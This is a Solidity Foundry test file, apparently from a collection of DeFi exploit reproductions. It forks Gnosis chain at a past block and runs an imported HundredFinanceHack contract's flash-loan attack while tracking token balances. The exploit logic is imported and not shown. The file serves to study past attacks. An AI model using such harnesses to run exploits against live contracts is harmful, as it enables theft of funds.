pragma solidity ^0.8.13;

import "../../pocs/HundredFinanceHack.sol";
import "../../src/PoC.sol";

contract HundredFinanceHackTest is PoC {
    uint256 mainnetFork;

    HundredFinanceHack public hundredFinanceHack;

    IERC20[] tokens;
    IERC20 constant husd = IERC20(0x243E33aa7f6787154a8E59d3C27a66db3F8818ee);
    IERC20 constant hxdai = IERC20(0x090a00A2De0EA83DEf700B5e216f87a5D4F394FE);
    IERC20 constant wxdai = IERC20(0xe91D153E0b41518A2Ce8Dd3D7944Fa863463a97d);

    function setUp() public {
        mainnetFork = vm.createFork("gnosis", 21120000);
        vm.selectFork(mainnetFork);

        hundredFinanceHack = new HundredFinanceHack();

        tokens.push(GnosisTokens.USDC);
        tokens.push(husd);

        setAlias(address(hundredFinanceHack), "Attacker");

        console.log("\n>>> Initial conditions");
    }

    function testFlashLoan() public snapshot(address(hundredFinanceHack), tokens) {
        hundredFinanceHack.initiateAttack();
    }
}
